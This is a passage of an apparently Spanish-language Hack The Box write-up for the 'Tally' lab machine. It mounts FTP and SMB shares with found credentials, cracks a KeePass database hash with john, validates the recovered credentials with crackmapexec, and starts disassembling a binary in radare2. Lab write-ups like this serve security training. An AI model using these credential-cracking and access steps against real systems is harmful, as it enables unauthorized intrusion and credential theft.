-&lt;p&gt;Vemos varios directorios dentro del servicio FTP. Para trabajar un poco más cómodos y poder visualizar todos los recursos, vamos a crearnos una montura con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curlftpfs&lt;/code&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: Si no tenemos la herramienta, la podemos instalar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get install curlftpfs&lt;/code&gt;):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/ftp
-❯ curlftpfs ftp_user:UTDRSCH53c&lt;span class=&quot;se&quot;&gt;\&quot;\$&lt;/span&gt;6hys@10.10.10.59 /mnt/ftp/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora accedemos a la ruta en nuestro sistema &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/ftp&lt;/code&gt; y podemos visualizar el contenido del servicio FTP de la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/ftp/
-❯ ll
-d--------- root root 0 B Thu Aug 31 23:51:00 2017  From-Custodian
-d--------- root root 0 B Sun Oct  1 23:37:00 2017  Intranet
-d--------- root root 0 B Mon Aug 28 18:56:00 2017  Logs
-d--------- root root 0 B Fri Sep 15 21:30:00 2017  To-Upload
-d--------- root root 0 B Sun Sep 17 21:27:00 2017  User
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si ejecutamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tree&lt;/code&gt; nos aparecerá mucha información, por lo que vamos a filtrarla omitiendo aquellos archivos que tengan &lt;strong&gt;RED-&lt;/strong&gt; y &lt;strong&gt;ftp_connect&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tree | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;red-|ftp_connect&quot;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                               
-├── From-Custodian
-├── Intranet                                                    
-│   └── Binaries
-│       └── Firefox Setup 44.0.2.exe
-├── Logs                                                                  
-├── To-Upload         
-│   ├── employees-id_number.xlsx
-│   └── Invoices.zip      
-└── User     
-    ├── Administrator           
-    │   └── New folder
-    ├── Ekta                                                    
-    │   ├── OFSI_quick_guide_flyer.pdf
-    │   └── PSAIS_1_April_2017.pdf
-    ├── Jess                                                    
-    │   └── actu8-espreadsheet-designer-datasheet.pdf
-    ├── Paul     
-    │   ├── financial-list-guide.pdf
-    │   ├── financial_sanctions_guidance_august_2017.pdf
-    │   ├── Monetary_penalties_for_breaches_of_financial_sanctions.pdf
-    │   └── New folder         
-    ├── Rahul                                                   
-    │   └── Mockups-Backup                                      
-    ├── Sarah                                                   
-    │   ├── MBSASetup-x64-EN.msi                                
-    │   ├── notes.txt          
-    │   └── Windows-KB890830-x64-V5.52.exe
-    ├── Stuart                                                  
-    │   ├── customers - Copy.csv
-    │   └── Unit4-Connect-Financials-Agenda.pdf
-    ├── Tim                                                     
-    │   ├── Files                                               
-    │   │   ├── bonus.txt                                       
-    │   │   ├── KeePass-2.36                                    
-    │   │   │   ├── KeePass.chm
-    │   │   │   ├── KeePass.exe
-    │   │   │   ├── KeePass.exe.config
-    │   │   │   ├── KeePassLibC32.dll
-    │   │   │   ├── KeePassLibC64.dll
-    │   │   │   ├── KeePass.XmlSerializers.dll
-    │   │   │   ├── License.txt
-    │   │   │   ├── Plugins
-    │   │   │   ├── ShInstUtil.exe
-    │   │   │   └── XSL
-    │   │   │       ├── KDBX_Common.xsl
-    │   │   │       ├── KDBX_DetailsFull_HTML.xsl
-    │   │   │       ├── KDBX_DetailsLight_HTML.xsl
-    │   │   │       ├── KDBX_PasswordsOnly_TXT.xsl
-    │   │   │       └── KDBX_Tabular_HTML.xsl
-    │   │   └── tim.kdbx
-    │   └── Project
-    │       ├── Communications
-    │       ├── Log
-    │       │   └── &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;to.txt
-    │       └── Vendors
-    └── Yenwi
-        └── Archive
-
-27 directories, 130 files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Algo que debemos de notar es que el posible usuario &lt;strong&gt;Tim&lt;/strong&gt; tiene un archivo de extensión &lt;strong&gt;kdbx&lt;/strong&gt;, asociado a la aplicación &lt;strong&gt;Keepass&lt;/strong&gt; para guardar credenciales; así que vamos a traerlo a nuestro directorio de trabajo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;User/Tim/Files/tim.kdbx /home/k4miyo/Documentos/HTB/Tally/content/.
-❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/k4miyo/Documentos/HTB/Tally/content/
-❯ file tim.kdbx
-tim.kdbx: Keepass password database 2.x KDBX
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si tratamos de abrir el archivo, este nos solicitará una contraseña:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-keepass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt; para generar un hash del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tim.kdbx&lt;/code&gt; y posteriormente tratar de crackearlo con  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ keepass2john tim.kdbx &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tim_hash
-❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt tim_hash
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KeePass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA256 AES 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 6000 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
-Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;version&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
-Cost 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;algorithm &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AES, &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TwoFish, &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ChaCha]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
-Will run 8 OpenMP threads
-Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-simplementeyo    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tim&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:03 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-11-18 22:27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.3105g/s 7672p/s 7672c/s 7672C/s teamomivida..rylee
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Contamos con la contraseña del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tim.kdbx&lt;/code&gt;, asi que vamos a ver su contenido.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-keepass1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-keepass2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tenemos unas nuevas credenciales, así que primeramente las guardamos. Ahora podríamos tratar de validarlas dentro del servicio SMB:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Finance'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Acc0unting'&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] TALLY&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;inance:Acc0unting
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Contamos con credenciales válidas de acceso al servicio SMB, pero como no nos pone un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwn3d&lt;/code&gt;, no podemos ejecutar comandos. Vamos por SMB para ver que podemos encontrar:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Finance'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Acc0unting'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--shares&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] TALLY&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;inance:Acc0unting 
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerated shares
-SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;           &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            ACCT            READ            
-SMB         10.10.10.59     445    TALLY            ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                         Remote Admin
-SMB         10.10.10.59     445    TALLY            C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                             Default share
-SMB         10.10.10.59     445    TALLY            IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                           Remote IPC
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que tenemos capacidad de lectura sobre el directorio &lt;strong&gt;ACCT&lt;/strong&gt;; asi que vamos a conectarnos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;s1&quot;&gt;'\\10.10.10.59\ACCT'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Finance%Acc0unting'&lt;/span&gt;
-Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Mon Sep 18 00:58:18 2017
-  ..                                  D        0  Mon Sep 18 00:58:18 2017
-  Customers                           D        0  Sun Sep 17 15:28:40 2017
-  Fees                                D        0  Mon Aug 28 16:20:52 2017
-  Invoices                            D        0  Mon Aug 28 16:18:19 2017
-  Jess                                D        0  Sun Sep 17 15:41:29 2017
-  Payroll                             D        0  Mon Aug 28 16:13:32 2017
-  Reports                             D        0  Fri Sep  1 15:50:11 2017
-  Tax                                 D        0  Sun Sep 17 15:45:47 2017
-  Transactions                        D        0  Wed Sep 13 14:57:44 2017
-  zz_Archived                         D        0  Fri Sep 15 15:29:35 2017
-  zz_Migration                        D        0  Sun Sep 17 15:49:13 2017
-
-                8387839 blocks of size 4096. 717276 blocks available
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos varios recursos, así que para trabajar mas cómodos, vamos a crearnos una mountura y de forma similar, vamos a ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tree&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/smbmounted
-❯ mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs &lt;span class=&quot;s2&quot;&gt;&quot;//10.10.10.59/ACCT&quot;&lt;/span&gt; /mnt/smbmounted/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Finance,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Acc0unting,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TALLY,rw
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Debido a que el servidor va muy lento, dentro del ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/smbmounted/zz_Migration/Binaries/&lt;/code&gt; vamos a ver una carpeta que se llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New folder&lt;/code&gt; (que destaca porque no tiene un nombre como los demás) y dentro de esta vemos un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tester.exe&lt;/code&gt; (que también destaca porque tiene un nombre no asociado con alguna aplicación como las demas).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;New folder&quot;&lt;/span&gt;
-❯ tree
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-├── crystal_reports_viewer_2016_sp04_51051980.zip
-├── Macabacus2016.exe
-├── Orchard.Web.1.7.3.zip
-├── putty.exe
-├── RpprtSetup.exe
-├── tableau-desktop-32bit-10-3-2.exe
-├── tester.exe
-└── vcredist_x64.exe
-
-0 directories, 8 files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tester.exe&lt;/code&gt; lo pasamos a nuestro directorio de trabajo para analizarlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;tester.exe /home/k4miyo/Documentos/HTB/Tally/content/.
-❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a analizar el archivo mediante el uso de la herramienta &lt;a href=&quot;https://github.com/radareorg/radare2&quot;&gt;radare2&lt;/a&gt;; por lo que tenemos que instalarla en nuestra máquina. (&lt;strong&gt;Nota&lt;/strong&gt;: Realizar la instalación como un usuario normal y no como root).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ radare2 tester.exe
- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Disassemble?! No Disassemble Johnny No. 5!!!
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x004092f5]&amp;gt; aaaa
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Analyze all flags starting with sym. and entry0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Analyze &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;calls &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aac&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Analyze len bytes of instructions &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;references &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aar&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Finding and parsing C++ vtables &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;avrr&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Type matching analysis &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all functions &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aaft&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Propagate noreturn information &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aanr&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Finding &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;preludes
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;x] Enable constraint types analysis &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;variables
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x004092f5]&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Inicializamos con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaaa&lt;/code&gt; en donde se nos muestra los pasos que toma y una breve descripción de estos. Con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;afl&lt;/code&gt; podemos ver las funciones que contiene el programa, con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf @main&lt;/code&gt; podemos ver a bajo nivel como está el programa. Lo mismo lo podemos lograr con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s main&lt;/code&gt; para movernos a la función &lt;strong&gt;main&lt;/strong&gt; y luego aplicar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x004011a0]&amp;gt; pdf @main                                                                                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;159/159]
-            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CALL XREF from entry0 @ 0x40927a               
-┌ 592: int main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int argc, char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;argv, char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;envp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                                            
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_49ch @ ebp-0x49c                                                                                   
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_498h @ ebp-0x498                                                                                   
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var signed int var_494h @ ebp-0x494                                                                                
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_490h @ ebp-0x490                                                                                   
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_48ch @ ebp-0x48c                                                                                   
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_488h @ ebp-0x488                
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_484h @ ebp-0x484                                                                                   
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_84h @ ebp-0x84                    
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_44h @ ebp-0x44                                                                                     
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; var int32_t var_4h @ ebp-0x4                                                                                       
-│           0x004011a0      55             push ebp           
-│           0x004011a1      8bec           mov ebp, esp                                                                          
-│           0x004011a3      81ec9c040000   sub esp, 0x49c                                                                        
-│           0x004011a9      a168304300     mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x433068]   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x433068:4]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbb40e64e &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;N&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e6@&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bfDu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;98&quot;&lt;/span&gt;
-│           0x004011ae      33c5           xor eax, ebp
-│           0x004011b0      8945fc         mov dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_4h], eax
-│           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x4013a9                                                                                     
-│       ┌─&amp;gt; 0x004011b3      8d8568fbffff   lea eax, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_498h]                                                                   
-│       ╎   0x004011b9      50             push eax                                                                              
-│       ╎   0x004011ba      6a00           push 0                                                                                
-│       ╎   0x004011bc      6a01           push 1                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1                                                       
-│       ╎   0x004011be      e8117c0000     call sub.ODBC32.dll_SQLAllocHandle                                                    
-│       ╎   0x004011c3      0fbfc8         movsx ecx, ax                                                                         
-│       ╎   0x004011c6      85c9           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;ecx, ecx                                                                         
-│      ┌──&amp;lt; 0x004011c8      7405           je 0x4011cf                                                                           
-│     ┌───&amp;lt; 0x004011ca      e9e0010000     jmp 0x4013af                                                                          
-│     ││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x4011c8                  
-│     │└──&amp;gt; 0x004011cf      6a00           push 0                                                                                
-│     │ ╎   0x004011d1      6a03           push 3                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 3                                                       
-│     │ ╎   0x004011d3      68c8000000     push 0xc8                   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 200                                                     
-│     │ ╎   0x004011d8      8b9568fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_498h]                                                             
-│     │ ╎   0x004011de      52             push edx                                                                              
-│     │ ╎   0x004011df      e81a7c0000     call sub.ODBC32.dll_SQLSetEnvAttr                                                     
-│     │ ╎   0x004011e4      98             cwde         
-│     │ ╎   0x004011e5      85c0           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;eax, eax                                                                         
-│     │┌──&amp;lt; 0x004011e7      7405           je 0x4011ee                                                                           
-│    ┌────&amp;lt; 0x004011e9      e9c1010000     jmp 0x4013af                                                                          
-│    │││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x4011e7                                                                                     
-│    ││└──&amp;gt; 0x004011ee      8d8d74fbffff   lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]                                                                   
-│    ││ ╎   0x004011f4      51             push ecx                                                                              
-│    ││ ╎   0x004011f5      8b9568fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_498h]
-│    ││ ╎   0x004011fb      52             push edx                                                                              
-│    ││ ╎   0x004011fc      6a02           push 2                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2                                                       
-│    ││ ╎   0x004011fe      e8d17b0000     call sub.ODBC32.dll_SQLAllocHandle
-│    ││ ╎   0x00401203      98             cwde                                                                                  
-│    ││ ╎   0x00401204      85c0           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;eax, eax
-│    ││┌──&amp;lt; 0x00401206      7405           je 0x40120d                                                                           
